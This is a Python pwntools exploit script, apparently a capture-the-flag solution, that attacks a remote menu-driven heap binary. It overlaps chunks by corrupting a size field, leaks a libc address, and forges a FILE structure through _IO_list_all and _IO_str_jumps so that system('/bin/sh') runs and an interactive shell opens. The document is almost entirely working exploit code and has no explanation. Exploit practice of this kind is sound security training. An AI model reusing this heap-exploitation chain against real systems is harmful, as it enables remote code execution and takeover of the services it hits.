from pwn import *

#p = process('./pwn')
p = remote('183.60.136.226',14823)
#p = remote('183.60.136.230',23333)
elf = ELF('./pwn')
libc = ELF('./libc.so')
context.log_level = 'debug'

def add(name,idx,context):
    p.sendlineafter('Input your choice:','1')
    p.sendlineafter('Member name:',name)
    p.sendlineafter('Description size:',str(idx))
    p.sendlineafter('Description:',context)
    
def delete(idx):
    p.sendlineafter('Input your choice:','2')
    p.sendlineafter('index:',str(idx))

def show(idx):
    p.sendlineafter('Input your choice:','3')
    p.sendlineafter('index:',str(idx))

add('A',0x18,'A'*0x18)#0
add('A',0x40,'A')#1
add('A',0x40,'B')#2
add('A',0x10,'C')#3

delete(0)

add('A',0,'A'*0x18+p64(0xa1))#0
delete(1)

add('A',0x40,'A')#1
show(2)
p.recvuntil('The Description:')
data = u64(p.recv(6).ljust(8,'\x00'))
libc_base = data - 0x3c4b78
io_list_all = libc_base + 0x3c5510
bin_addr = libc_base + libc.search('/bin/sh').next()
io_str_jumps = libc_base + 0x3c37a0
system_addr = libc_base + libc.symbols['system']
puts_addr = libc_base + libc.symbols['puts']
log.success('libc base :'+hex(libc_base))

delete(0)

payload = 'A'*0x18+p64(0x51)+'A'*0x40+p64(0)+p64(0x61)
payload += p64(libc_base+0x3c4b78)+p64(io_list_all)
payload += p64(0)+p64(1)
payload += p64(0)+p64(bin_addr)
payload += p64(0)*19
payload += p64(io_str_jumps-8) # -> IO_str_finish
payload = payload.ljust(0xe8+0x60,'\x00')
payload += p64(system_addr)

add('A',0,payload)#0

p.sendlineafter('Input your choice:','1')
#gdb.attach(p)
p.sendlineafter('Member name:','A')
p.sendlineafter('Description size:','1')

p.interactive()
